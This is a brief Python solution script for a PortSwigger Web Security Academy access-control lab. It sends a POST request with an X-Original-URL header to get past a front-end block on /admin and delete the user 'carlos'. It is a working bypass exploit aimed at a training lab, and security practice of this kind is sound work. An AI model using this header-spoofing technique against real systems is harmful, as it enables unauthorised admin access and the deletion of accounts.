'''This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

To solve the lab, access the admin panel and delete the user carlos.

Lab link: https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented
'''

import requests


lab_id = '0afe00a0044e78a28341162600570089' # change according to generated lab_id

# We send a request directly to the url to delete the carlos user since it is unauthenticated.
# All we need to do is set the "X-Original-URL" header to the proper redirect address
uri = f"https://{lab_id}.web-security-academy.net/"
redirect = "/admin/delete"
headers = {'X-Original-Url' : redirect}
data = {'username' : 'carlos'}
r1 = requests.post(uri, headers=headers, data=data)
print('finished')